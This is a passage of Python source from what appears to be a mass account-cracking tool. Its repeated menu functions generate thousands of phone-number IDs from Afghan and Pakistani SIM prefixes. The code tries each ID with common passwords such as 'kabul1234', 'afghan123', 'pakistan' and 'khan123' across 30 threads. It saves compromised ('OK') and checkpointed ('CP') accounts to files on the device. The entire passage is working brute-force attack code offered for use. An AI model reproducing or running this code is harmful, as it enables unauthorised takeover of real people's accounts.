    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm15():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m93777, 93766, 93767, 93776...')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m93799, 93729, 93728, 93796...')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m93701, 93786, 93788, 93784...')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'kabul1234']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm16():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m93777, 93766, 93767, 93776...')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m93799, 93729, 93728, 93796...')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m93701, 93786, 93788, 93784...')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'kabul123']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm17():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m93777, 93766, 93767, 93776...')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m93799, 93729, 93728, 93796...')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m93701, 93786, 93788, 93784...')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'afghan1234']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm18():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m93777, 93766, 93767, 93776...')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m93799, 93729, 93728, 93796...')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m93701, 93786, 93788, 93784...')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'afghan123']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm19():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m93777, 93766, 93767, 93776...')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m93799, 93729, 93728, 93796...')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m93701, 93786, 93788, 93784...')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'afghanistan']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm20():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;93mMTN SIM CODES  \033[1;91m             : \033[1;96m93777, 93766, 93767, 93776...')
    print(f'\033[1;97m[!] \033[1;93mROSHAN SIM CODES \033[1;91m           : \033[1;96m93799, 93729, 93728, 93796...')
    print(f'\033[1;97m[!] \033[1;93mAWCC + ETISALAT SIM CODES \033[1;91m  : \033[1;96m93701, 93786, 93788, 93784...')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'afghan']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()

def awm21():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'khankhan']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
      
def awm22():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'khan1234']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
    
    
    
def awm23():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'khan123']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
    
    
def awm24():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'pakistan']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
    
    
def awm25():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'khan khan']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
    
def awm26():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
